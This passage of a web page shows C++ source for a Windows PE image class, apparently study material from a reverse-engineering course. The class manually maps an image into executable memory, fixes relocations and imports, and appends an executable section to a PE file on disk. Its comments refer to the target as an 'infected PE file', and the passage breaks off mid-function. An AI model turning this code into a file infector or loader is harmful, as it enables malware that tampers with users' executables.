class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;_CPEImage.h&quot;</span></span><br><br><br>_CPEImage::_CPEImage()<br>&#123;<br>	m_FileHandle = INVALID_HANDLE_VALUE;    <span class="hljs-comment">//文件句柄  </span><br>	m_ModuleHandle = <span class="hljs-literal">NULL</span>;                  <span class="hljs-comment">//内存申请</span><br>	m_ImageDosHeader  = <span class="hljs-literal">NULL</span>;<br>	m_ImageFileHeader = <span class="hljs-literal">NULL</span>;<br>	m_ImageOptionalHeader = <span class="hljs-literal">NULL</span>;<br>	m_ImageSectionHeader  = <span class="hljs-literal">NULL</span>;<br>	m_ImageExportDirectory  = <span class="hljs-literal">NULL</span>;<br>	m_ImageImportDescriptor = <span class="hljs-literal">NULL</span>;<br>	m_RelocateDataTable = <span class="hljs-literal">NULL</span>;<br><br><br>&#125;<br><br>_CPEImage::~_CPEImage()<br>&#123;<br>	<span class="hljs-keyword">if</span> (m_ModuleHandle!=<span class="hljs-literal">NULL</span>)<br>	&#123;<br>		<span class="hljs-built_in">VirtualFree</span>(m_ModuleHandle, <span class="hljs-number">0</span>, MEM_RELEASE);<br>		m_ModuleHandle = <span class="hljs-literal">NULL</span>;<br>	&#125;<br>	<br>&#125;<br><br><span class="hljs-function">PBYTE <span class="hljs-title">_CPEImage::LoadImage</span><span class="hljs-params">(HANDLE FileHandle, BOOL IsDoRelocate, ULONG_PTR RelocateBase, BOOL IsDoImport)</span></span><br><span class="hljs-function"></span>&#123;<br>	WORD i = <span class="hljs-number">0</span>;<br>	BYTE *v5 = <span class="hljs-literal">NULL</span>;<br>	BYTE *MappedBase = <span class="hljs-literal">NULL</span>;<br>	PIMAGE_SECTION_HEADER ImageSectionHeader = <span class="hljs-literal">NULL</span>;<br>	BOOL IsOk = FALSE;<br>	DWORD FileSizeLow = <span class="hljs-number">0</span>; <span class="hljs-comment">//一般PE文件大小不会超过4G</span><br>	DWORD NumberOfBytesRead = <span class="hljs-number">0</span>;<br><br>	__try<br>	&#123;<br><br>		m_FileHandle = FileHandle;<br>		<span class="hljs-comment">//获取文件大小</span><br>		FileSizeLow = <span class="hljs-built_in">GetFileSize</span>(m_FileHandle, <span class="hljs-literal">NULL</span>);<br>		<span class="hljs-keyword">if</span> (FileSizeLow == <span class="hljs-number">0</span>)<br>		&#123;<br>			__leave;<br>		&#125;<br><br>		<span class="hljs-comment">//读取PE头</span><br>		DWORD NumberOfBytesToRead = (FileSizeLow &gt; BUFFER_LENGTH) ? BUFFER_LENGTH : FileSizeLow;<br>		<span class="hljs-built_in">ZeroMemory</span>(m_BufferData, BUFFER_LENGTH);<br>		<br>		<span class="hljs-comment">//读取被感染PE文件的0x1000大小数据</span><br>		IsOk = <span class="hljs-built_in">ReadFile</span>(m_FileHandle, m_BufferData, NumberOfBytesToRead, &amp;NumberOfBytesRead, <span class="hljs-literal">NULL</span>);<br>		<span class="hljs-keyword">if</span> (!IsOk)<br>		&#123;<br>			__leave;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">VerifyImage</span>(m_BufferData))  <span class="hljs-comment">//判断是否是一个PE文件 0x1000</span><br>		&#123;<br>			__leave;<br>		&#125;<br><br>		<span class="hljs-comment">//解析各个PE头部结构</span><br>		<span class="hljs-built_in">InitializePeHeaders</span>(m_BufferData);<span class="hljs-comment">//导入描述 导出目录的数据信息</span><br><br>		<span class="hljs-comment">//定义一个游走指针</span><br>		ImageSectionHeader = m_ImageSectionHeader;<br><br><br>		<span class="hljs-comment">//在我们进程中内存申请</span><br>		v5 = m_ModuleHandle = (BYTE*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, m_SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>		<span class="hljs-keyword">if</span> (v5 == <span class="hljs-literal">NULL</span>)<br>		&#123;<br><br>			__leave;<br>		&#125;<br>		<br>		<span class="hljs-comment">//现将被感染PE文件中的头部数据拷贝到内存中</span><br>		<span class="hljs-built_in">memcpy</span>(v5, m_BufferData, m_ImageOptionalHeader-&gt;SizeOfHeaders);  <span class="hljs-comment">//0x200    ---  0x1000</span><br>		<br>		<span class="hljs-comment">//按照内存粒度对齐整理文件头部信息</span><br>		v5 += <span class="hljs-built_in">GetAlignedSize</span>(m_ImageOptionalHeader-&gt;SizeOfHeaders, m_ImageOptionalHeader-&gt;SectionAlignment);<br><br><br><br>		<span class="hljs-comment">//整理节数据</span><br><br>		<span class="hljs-comment">//逆向工程核心原理104 图对照   v5内存粒度对齐图</span><br>		LARGE_INTEGER v1;<br>		<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; m_NumberOfSections; i++)<br>		&#123;<br>			v1.QuadPart = ImageSectionHeader-&gt;PointerToRawData;<br>			IsOk = <span class="hljs-built_in">SetFilePointerEx</span>(m_FileHandle, v1, <span class="hljs-literal">NULL</span>, FILE_BEGIN);   <span class="hljs-comment">//根据PointerToRawData中的值定位文件位置</span><br>			<span class="hljs-keyword">if</span> (!IsOk)<br>			&#123;<br>				__leave;<br>			&#125;<br><br>			<span class="hljs-comment">//读取各个节</span><br>			IsOk = <span class="hljs-built_in">ReadFile</span>(m_FileHandle, v5, ImageSectionHeader-&gt;SizeOfRawData, &amp;NumberOfBytesRead, <span class="hljs-literal">NULL</span>);<br>			<span class="hljs-keyword">if</span> (!IsOk)<br>			&#123;<br>			<br>				__leave;<br>			&#125;<br>			v5 += <span class="hljs-built_in">GetAlignedSize</span>(ImageSectionHeader-&gt;Misc.VirtualSize, m_ImageOptionalHeader-&gt;SectionAlignment);<br>			ImageSectionHeader++;<br>		&#125;<br><br>		<span class="hljs-comment">//重新解析PE头</span><br>		<span class="hljs-built_in">InitializePeHeaders</span>(m_ModuleHandle);<br><br>		<span class="hljs-comment">//开始处理重定位数据</span><br>		<span class="hljs-keyword">if</span> (IsDoRelocate)<br>		&#123;<br>			<span class="hljs-comment">//如果RelocateBase为0，则按实际加载位置进行重定位</span><br>			ULONG_PTR v2 = (RelocateBase == <span class="hljs-number">0</span>) ? (DWORD)m_ModuleHandle : RelocateBase;<br>			<span class="hljs-built_in">ProcessRelocateTable</span>(v2);<br>		&#125;<br><br>		<span class="hljs-comment">//处理导入表</span><br>		<span class="hljs-keyword">if</span> (IsDoImport)<br>		&#123;<br>			<span class="hljs-built_in">ProcessImportTable</span>();<br>		&#125;<br><br>		IsOk = TRUE; <span class="hljs-comment">//加载成功</span><br>	&#125;<br>	__finally<br>	&#123;<br>		<span class="hljs-keyword">if</span> (!IsOk)<br>		&#123;<br>			<span class="hljs-keyword">if</span> (m_FileHandle != INVALID_HANDLE_VALUE)<br>			&#123;<br>				<span class="hljs-built_in">CloseHandle</span>(m_FileHandle);<br>				m_FileHandle = INVALID_HANDLE_VALUE;<br>			&#125;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> m_ModuleHandle;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">_CPEImage::VerifyImage</span><span class="hljs-params">(PVOID VirtualAddress)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">//解析各个PE头部结构</span><br>	m_ImageDosHeader = (PIMAGE_DOS_HEADER)VirtualAddress;<br>	<span class="hljs-keyword">if</span> (m_ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE)<br>	&#123;<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	m_ImageNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)VirtualAddress + m_ImageDosHeader-&gt;e_lfanew);<br>	<span class="hljs-keyword">if</span> (m_ImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE)<br>	&#123;<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">_CPEImage::InitializePeHeaders</span><span class="hljs-params">(PBYTE VirtualAddress)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">//解析各个PE头部结构</span><br>	m_ModuleHandle = VirtualAddress;<br>	m_ImageDosHeader = (PIMAGE_DOS_HEADER)VirtualAddress;<br>	m_ImageNtHeaders = (PIMAGE_NT_HEADERS)(VirtualAddress + m_ImageDosHeader-&gt;e_lfanew);<br>	m_ImageFileHeader = &amp;m_ImageNtHeaders-&gt;FileHeader;<br>	m_NumberOfSections = m_ImageFileHeader-&gt;NumberOfSections;<br>	m_ImageOptionalHeader = &amp;m_ImageNtHeaders-&gt;OptionalHeader;<br>	m_RelocateDataTable = &amp;(m_ImageOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);  <span class="hljs-comment">//VirtualAddress  Size</span><br>	m_ImageSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE*)m_ImageOptionalHeader + m_ImageFileHeader-&gt;SizeOfOptionalHeader);<br>	m_AddressOfEntryPoint = m_ImageOptionalHeader-&gt;AddressOfEntryPoint;  <span class="hljs-comment">//RVA</span><br>	m_SizeOfImage = m_ImageOptionalHeader-&gt;SizeOfImage;                 <br>	m_ImageBase = (ULONG_PTR)m_ImageOptionalHeader-&gt;ImageBase;<br><br>	<span class="hljs-comment">//导入表</span><br>	m_ImportDataTable = &amp;m_ImageOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];<br>	<span class="hljs-comment">//因为导入表可能会被修改，所以先保存旧的导入表数据</span><br>	m_OldImportDataTable.VirtualAddress = m_ImportDataTable-&gt;VirtualAddress;<br>	m_OldImportDataTable.Size = m_ImportDataTable-&gt;Size;<br>	<br>	<span class="hljs-keyword">if</span> (m_ImportDataTable-&gt;VirtualAddress != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		m_ImageImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(VirtualAddress + m_ImportDataTable-&gt;VirtualAddress);<br>	&#125;<br><br>	<span class="hljs-comment">//导出表</span><br>	m_ExportDataTable = &amp;m_ImageOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];<br>	<span class="hljs-keyword">if</span> (m_ExportDataTable-&gt;VirtualAddress != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		m_ImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(VirtualAddress + m_ExportDataTable-&gt;VirtualAddress);<br>	&#125;<br><br><br><br>&#125;<br><br><br><span class="hljs-function">DWORD <span class="hljs-title">_CPEImage::GetAlignedSize</span><span class="hljs-params">(DWORD BufferLength, DWORD Alignment)</span></span><br><span class="hljs-function"></span>&#123;<br>	DWORD v1 = <span class="hljs-number">0</span>;<br>	v1 = <span class="hljs-built_in">ALIGN_SIZE_UP</span>(BufferLength, Alignment);<br>	<span class="hljs-keyword">return</span> v1;<span class="hljs-comment">//返回对齐后的大小</span><br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">_CPEImage::ProcessRelocateTable</span><span class="hljs-params">(ULONG_PTR RelocateBase)</span></span><br><span class="hljs-function"></span>&#123;<br>	WORD i = <span class="hljs-number">0</span>;<br><br>	PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)(RelocateBase + ((PIMAGE_DOS_HEADER)RelocateBase)-&gt;e_lfanew);<br>	<br>	PIMAGE_DATA_DIRECTORY ImageDataDirectory = (PIMAGE_DATA_DIRECTORY)&amp;((PIMAGE_NT_HEADERS)ImageNtHeaders)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];<br>	PIMAGE_BASE_RELOCATION ImageBaseRelocation = (PIMAGE_BASE_RELOCATION)(RelocateBase + ((PIMAGE_DATA_DIRECTORY)ImageDataDirectory)-&gt;VirtualAddress);<br><br>	<span class="hljs-keyword">if</span> (ImageBaseRelocation-&gt;VirtualAddress != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		<br>		<span class="hljs-keyword">do</span><br>		&#123;<span class="hljs-comment">//处理一个接一个的重定位块，最后一个重定位块以RAV=0结束</span><br>			<span class="hljs-comment">//需要重定位的个数，是本块的大小减去块头的大小，结果是以DWORD表示的大小</span><br>			<span class="hljs-comment">//而重定位数据是16位的，那就得除以2</span><br>			<span class="hljs-type">int</span> v7 = (ImageBaseRelocation-&gt;SizeOfBlock - <span class="hljs-built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="hljs-number">2</span>;<br>		<br>			<span class="hljs-comment">//重定位数据是16位的</span><br>			WORD Offset = <span class="hljs-number">0</span>;<br>			WORD *v1 = (WORD*)((BYTE*)ImageBaseRelocation + <span class="hljs-built_in">sizeof</span>(IMAGE_BASE_RELOCATION));<br>			<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; v7; i++)<span class="hljs-comment">//循环，或直接判断*pData是否为0也可以作为结束标记</span><br>			&#123;<br>				ULONG_PTR *RelocateAddress = <span class="hljs-number">0</span>;<span class="hljs-comment">//需要重定位的地址</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br>				WORD RelocateFlag = IMAGE_REL_BASED_DIR64;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>				WORD RelocateFlag = IMAGE_REL_BASED_HIGHLOW;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>				<span class="hljs-comment">//IMAGE_REL_BASED_DIR64</span><br>				<span class="hljs-comment">//重定位的高4位是重定位类型，</span><br>				<span class="hljs-keyword">if</span> (((*v1) &gt;&gt; <span class="hljs-number">12</span>) == RelocateFlag)<span class="hljs-comment">//判断重定位类型是否为IMAGE_REL_BASED_HIGHLOW,x86</span><br>				&#123;<br>					<span class="hljs-comment">//计算需要进行重定位的地址</span><br>					<span class="hljs-comment">//重定位数据的低12位再加上本重定位块头的RAV即真正需要重定位的数据的RAV</span><br>					Offset = (*v1) &amp; <span class="hljs-number">0xFFF</span>;<span class="hljs-comment">//小偏移</span><br>					RelocateAddress = (ULONG_PTR*)(RelocateBase + ImageBaseRelocation-&gt;VirtualAddress + Offset);<br>					<span class="hljs-comment">//对需要重定位的数据进行修正</span><br>					<span class="hljs-comment">//修正方法:减去IMAGE_OPTINAL_HEADER中的基址，再加上新的基址即可</span><br>					*RelocateAddress = *RelocateAddress - m_ImageOptionalHeader-&gt;ImageBase + RelocateBase;<br>				&#125;<br>				v1++;<br><br>			&#125;<br>			<span class="hljs-comment">//指向下一个重定位块</span><br>			ImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((<span class="hljs-type">char</span>*)ImageBaseRelocation + ImageBaseRelocation-&gt;SizeOfBlock);<br><br>		&#125; <span class="hljs-keyword">while</span> (ImageBaseRelocation-&gt;VirtualAddress);<br>	&#125;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">_CPEImage::ProcessImportTable</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	BOOL IsOk = TRUE;<br>	TCHAR v1[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>	<span class="hljs-type">char</span> szCurDirectory[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>	<span class="hljs-type">char</span> szPrompt[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>	PIMAGE_IMPORT_DESCRIPTOR  ImageImportDescriptor = m_ImageImportDescriptor;<br>	PIMAGE_THUNK_DATA         OriginalFirstThunk = <span class="hljs-literal">NULL</span>, FirstThunk = <span class="hljs-literal">NULL</span>;<br>	PIMAGE_IMPORT_BY_NAME	  pImpName = <span class="hljs-literal">NULL</span>;<br>	HMODULE ModuleHandle = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-type">char</span> *Name = <span class="hljs-literal">NULL</span>;<br><br>	<span class="hljs-keyword">if</span> (ImageImportDescriptor == <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		<span class="hljs-comment">//无导入表，不需要处理</span><br>		<span class="hljs-keyword">return</span> TRUE;<br>	&#125;<br>	<span class="hljs-keyword">while</span> (ImageImportDescriptor-&gt;Name &amp;&amp; ImageImportDescriptor-&gt;OriginalFirstThunk)<br>	&#123;<br>		Name = (<span class="hljs-type">char</span>*)m_ModuleHandle + ImageImportDescriptor-&gt;Name;<br>		ModuleHandle = <span class="hljs-built_in">LoadLibraryA</span>(Name);<br>		<span class="hljs-keyword">if</span> (ModuleHandle == <span class="hljs-literal">NULL</span>)<br>		&#123;<br>			<span class="hljs-keyword">return</span> FALSE;<br>		&#125;<br><br>		<span class="hljs-comment">//printf(&quot;处理导入表模块 : %s\n&quot;,szImpModName);</span><br>		OriginalFirstThunk = (PIMAGE_THUNK_DATA)(m_ModuleHandle + (ULONG)ImageImportDescriptor-&gt;OriginalFirstThunk);<br>		FirstThunk = (PIMAGE_THUNK_DATA)(m_ModuleHandle + (ULONG)ImageImportDescriptor-&gt;FirstThunk);<br><br>		<span class="hljs-keyword">while</span> (OriginalFirstThunk-&gt;u1.AddressOfData)<br>		&#123;<br>			IsOk = <span class="hljs-built_in">SnapThunk</span>(ModuleHandle, Name, m_ModuleHandle, OriginalFirstThunk, FirstThunk);<br>			<span class="hljs-keyword">if</span> (!IsOk)<br>			&#123;<br>				IsOk = FALSE;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>			OriginalFirstThunk++;<br>			FirstThunk++;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!IsOk)<br>		&#123;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		ImageImportDescriptor++;<br>	&#125;<br><br><br>	<span class="hljs-keyword">return</span> IsOk;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">_CPEImage::SnapThunk</span><span class="hljs-params">(HMODULE ModuleHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">	<span class="hljs-type">char</span> *Name, PBYTE ImageBase, PIMAGE_THUNK_DATA OriginalFirstThunk, PIMAGE_THUNK_DATA FirstThunk)</span></span><br><span class="hljs-function"></span>&#123;<br>	BOOL IsOk = FALSE;<br>	PIMAGE_IMPORT_BY_NAME	  ImageImportByName = <span class="hljs-literal">NULL</span>;<br>	DWORD v1 = <span class="hljs-number">0</span>;<br>	ULONG Ordinal = <span class="hljs-number">0</span>;<br><br>	<span class="hljs-keyword">if</span> (OriginalFirstThunk-&gt;u1.AddressOfData &amp; IMAGE_ORDINAL_FLAG32)<br>	&#123;<br>		Ordinal = <span class="hljs-built_in">IMAGE_ORDINAL</span>(OriginalFirstThunk-&gt;u1.Ordinal);<br>		v1 = (ULONG_PTR)<span class="hljs-built_in">GetProcAddress</span>(ModuleHandle, (LPCSTR)Ordinal);<br>	<br>		<span class="hljs-keyword">if</span> (v1 == <span class="hljs-number">0</span>)<br>		&#123;<br>			_tprintf(_T(<span class="hljs-string">&quot;无法在导入模块%s中定位导入函数:%d (序号)&quot;</span>), Name, Ordinal);<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		ImageImportByName = (PIMAGE_IMPORT_BY_NAME)(m_ModuleHandle + (ULONG)OriginalFirstThunk-&gt;u1.AddressOfData);<br>		v1 = (ULONG_PTR)<span class="hljs-built_in">GetProcAddress</span>(ModuleHandle, (LPCSTR)ImageImportByName-&gt;Name);<br>		<span class="hljs-comment">//printf(&quot;0x%08X 按名称导入 : %s\n&quot;,dwFunAddr,pImpName-&gt;Name);</span><br>		<span class="hljs-keyword">if</span> (v1 == <span class="hljs-number">0</span>)<br>		&#123;<br>			_tprintf(_T(<span class="hljs-string">&quot;无法在导入模块%s中定位导入函数:%s &quot;</span>), Name, ImageImportByName-&gt;Name);<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (v1 != <span class="hljs-number">0</span>)<br>	&#123;<br>		FirstThunk-&gt;u1.Function = v1;<br>		IsOk = TRUE;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> IsOk;<br>&#125;<br><span class="hljs-comment">//根据相对虚拟地址查找所在的节</span><br><span class="hljs-function">PIMAGE_SECTION_HEADER <span class="hljs-title">_CPEImage::LocateSectionByRva</span><span class="hljs-params">(DWORD Rva)</span></span><br><span class="hljs-function"></span>&#123;<br>	WORD i = <span class="hljs-number">0</span>;<br>	PIMAGE_SECTION_HEADER ImageSectionHeader = m_ImageSectionHeader;<br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; m_NumberOfSections; i++)<br>	&#123;<br>		<span class="hljs-keyword">if</span> (ImageSectionHeader-&gt;VirtualAddress &lt;= Rva<br>			&amp;&amp; Rva &lt; (ImageSectionHeader-&gt;VirtualAddress + ImageSectionHeader-&gt;Misc.VirtualSize))<br>		&#123;<br>			<span class="hljs-keyword">return</span> ImageSectionHeader;<br>		&#125;<br>		ImageSectionHeader++;<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-function">PIMAGE_SECTION_HEADER <span class="hljs-title">_CPEImage::LocateSectionByFileOffset</span><span class="hljs-params">(DWORD ParameterData)</span></span><br><span class="hljs-function"></span>&#123;<br>	WORD i = <span class="hljs-number">0</span>;<br>	PIMAGE_SECTION_HEADER ImageSectionHeader = m_ImageSectionHeader;<br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; m_NumberOfSections; i++)<br>	&#123;<br>		<span class="hljs-keyword">if</span> (ImageSectionHeader-&gt;PointerToRawData &lt;= ParameterData<br>			&amp;&amp; ParameterData &lt; (ImageSectionHeader-&gt;PointerToRawData + ImageSectionHeader-&gt;SizeOfRawData))<br>		&#123;<br>			<span class="hljs-keyword">return</span> ImageSectionHeader;<br>		&#125;<br>		ImageSectionHeader++;<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-comment">//计算某个节按虚拟地址对齐后的空隙大小</span><br><span class="hljs-comment">//VirtualSize和RawSize不确定哪个比较大</span><br><span class="hljs-function">DWORD <span class="hljs-title">_CPEImage::GetSectionPhysialPaddingSize</span><span class="hljs-params">(PIMAGE_SECTION_HEADER ImageSectionHeader)</span></span><br><span class="hljs-function"></span>&#123;<br>	DWORD PaddingSize = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">if</span> (ImageSectionHeader-&gt;Misc.VirtualSize &lt; ImageSectionHeader-&gt;SizeOfRawData)<br>	&#123;<br>		<span class="hljs-comment">//节的内存大小小于文件大小</span><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		.text name</span><br><span class="hljs-comment">		7748 virtual size</span><br><span class="hljs-comment">		1000 virtual address</span><br><span class="hljs-comment">		7800 size of raw data</span><br><span class="hljs-comment">		*/</span><br>		PaddingSize = ImageSectionHeader-&gt;SizeOfRawData - ImageSectionHeader-&gt;Misc.VirtualSize;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-comment">//节的内存大小大于等于文件中的大小,则认为不存在空隙</span><br>		PaddingSize = <span class="hljs-number">0</span>;<br><br>	&#125;<br>	<span class="hljs-keyword">return</span> PaddingSize;<br>&#125;<br><br><span class="hljs-function">PIMAGE_SECTION_HEADER <span class="hljs-title">_CPEImage::AddNewSectionToFile</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *SectionName, DWORD SectionSize)</span></span><br><span class="hljs-function"></span>&#123;<br>	PIMAGE_SECTION_HEADER NewImageSectionHeader = m_ImageSectionHeader + m_NumberOfSections;<br>	PIMAGE_SECTION_HEADER LastImageSectionHeader = m_ImageSectionHeader + m_NumberOfSections - <span class="hljs-number">1</span>;<br>	DWORD VirtualAddress, PointerToRawData, VirtualSize;<br>	LARGE_INTEGER v1;<br>	BOOL IsOk = FALSE;<br>	DWORD NumberOfBytesWritten = <span class="hljs-number">0</span>;<br><br>	<span class="hljs-comment">//计算新节的起始虚拟内存偏移</span><br>	VirtualAddress = LastImageSectionHeader-&gt;VirtualAddress + <span class="hljs-built_in">GetAlignedSize</span>(LastImageSectionHeader-&gt;Misc.VirtualSize, m_ImageOptionalHeader-&gt;SectionAlignment);<br>	<span class="hljs-comment">//计算新节的物理起始偏移</span><br>	PointerToRawData = LastImageSectionHeader-&gt;PointerToRawData + <span class="hljs-built_in">GetAlignedSize</span>(LastImageSectionHeader-&gt;SizeOfRawData, m_ImageOptionalHeader-&gt;FileAlignment);<br>	<span class="hljs-comment">//计算新节的大小，按文件对齐粒度对齐</span><br>	VirtualSize = <span class="hljs-built_in">GetAlignedSize</span>(SectionSize, m_ImageOptionalHeader-&gt;FileAlignment);<br><br>	<span class="hljs-comment">//设置文件指针位置</span><br>	v1.QuadPart = PointerToRawData + VirtualSize;<br>	IsOk = <span class="hljs-built_in">SetFilePointerEx</span>(m_FileHandle, v1, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br>	<span class="hljs-keyword">if</span> (!IsOk)<br>	&#123;<br>	<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>	&#125;<br><br>	IsOk = <span class="hljs-built_in">SetEndOfFile</span>(m_FileHandle);<br>	<span class="hljs-keyword">if</span> (!IsOk)<br>	&#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>	&#125;<br><br>	<span class="hljs-comment">//填充SectionHeader</span><br>	<span class="hljs-built_in">ZeroMemory</span>(NewImageSectionHeader, <span class="hljs-built_in">sizeof</span>(IMAGE_SECTION_HEADER));<br>	<span class="hljs-built_in">strncpy_s</span>((<span class="hljs-type">char</span>*)NewImageSectionHeader-&gt;Name,<span class="hljs-number">8</span>, SectionName, <span class="hljs-number">8</span>);<br>	NewImageSectionHeader-&gt;Misc.VirtualSize = VirtualSize;<br>	NewImageSectionHeader-&gt;VirtualAddress = VirtualAddress;<br>	NewImageSectionHeader-&gt;PointerToRawData = PointerToRawData;<br>	NewImageSectionHeader-&gt;SizeOfRawData = VirtualSize;<br>	NewImageSectionHeader-&gt;Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;<br><br>	<span class="hljs-comment">//更新PE头中的节个数</span><br>	m_ImageFileHeader-&gt;NumberOfSections += <span class="hljs-number">1</span>;<br>	m_NumberOfSections++;<br>	<span class="hljs-comment">//更新PE头中的总映像大小</span><br>	m_ImageOptionalHeader-&gt;SizeOfImage += VirtualSize;<br><br>	<span class="hljs-comment">//保存PE头到文件中</span><br>	v1.QuadPart = <span class="hljs-number">0</span>;<br>	IsOk = <span class="hljs-built_in">SetFilePointerEx</span>(m_FileHandle, v1, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br>	<span class="hljs-keyword">if</span> (!IsOk)<br>	&#123;<br>		<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>	&#125;<br><br>	IsOk = <span class="hljs-built_in">WriteFile</span>(m_FileHandle, m_ModuleHandle, m_ImageOptionalHeader-&gt;SizeOfHeaders, &amp;NumberOfBytesWritten, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (!IsOk)<br>	&#123;<br>	<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>	&#125;<br><br>	<span class="hljs-built_in">FlushFileBuffers</span>(m_FileHandle);<br>	<span class="hljs-keyword">return</span> NewImageSectionHeader;<br>&#125;<br><span class="hljs-function">DWORD <span class="hljs-title">_CPEImage::Raw2Rva</span><span class="hljs-params">(DWORD FileOffset)</span></span><br><span class="hljs-function"></span>&#123;<br>	DWORD RVA = <span 